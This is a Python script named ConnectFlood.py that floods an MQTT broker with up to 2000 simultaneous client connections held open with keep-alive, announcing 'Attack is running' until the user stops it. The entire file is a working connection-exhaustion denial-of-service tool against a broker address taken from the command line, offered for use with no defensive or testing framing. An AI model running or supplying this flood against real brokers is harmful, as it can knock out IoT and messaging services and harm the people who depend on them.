#!/usr/bin/python3
import paho.mqtt.client as mqtt
import time
from tqdm import tqdm
import subprocess
import sys

def parsing_parameters():
    l = len(sys.argv)
    port = 1883
    keepAlive = 60

    if (l == 1):
        print('''\n    Usage:
    python3 ConnectFlood.py -a <Broker_Address> -p <Broker_Port> -k <Keep_Alive>
    -a\tIP address of MQTT broker
    -p\tport of MQTT broker (default 1883)
    -k\tkeep alive parameter of MQTT protocol (default 60 sec)
        ''')
        exit()

    for i in range(1, l):
        if (sys.argv[i] == '-p' and i < l):
            port = sys.argv[i + 1]
        elif (sys.argv[i] == '-k' and i < l):
            if (int(sys.argv[i + 1]) > 65535 or int(sys.argv[i + 1]) <= 0):
                keepAlive = 60
            else:
                keepAlive = sys.argv[i + 1]
        elif (sys.argv[i] == '-a' and i < l):
            broker_address = sys.argv[i + 1]
        elif ((sys.argv[i] == '--help' or sys.argv[i] == '-h') and i <= l):
            print('''\nUsage:
    python3 ConnectFlood.py -a <Broker_Address> -p <Broker_Port> -k <Keep_Alive>
            ''')
            exit()
    return broker_address, int(port), int(keepAlive)

try:
    _broker_address, _port, _keepAlive = parsing_parameters()
    vett = []
    print('\nRequesting connections...\n')
    # Connect up to a common limit, e.g., 2000 clients
    for i in tqdm(range(2000)):
        client_id = f'client{i}'
        client = mqtt.Client(client_id=client_id, callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
        vett.append(client)
        try:
            client.connect(_broker_address, _port, _keepAlive)
            client.loop_start() # Use loop_start for non-blocking connect
        except Exception as e:
            print(f"\nFailed to connect client {i}: {e}. Maybe the server is full.")
            break
    print('\nRequests sent! Attack is running...\n')
    end = input('[ Press any key to stop the attack ]\n')
    print('[ Attack terminated. Disconnecting clients... ]\n')
    for client in vett:
        client.loop_stop()
        client.disconnect()

except KeyboardInterrupt:
    subprocess.call('clear', shell=True)
    print('ERROR: unexpected attack stop')
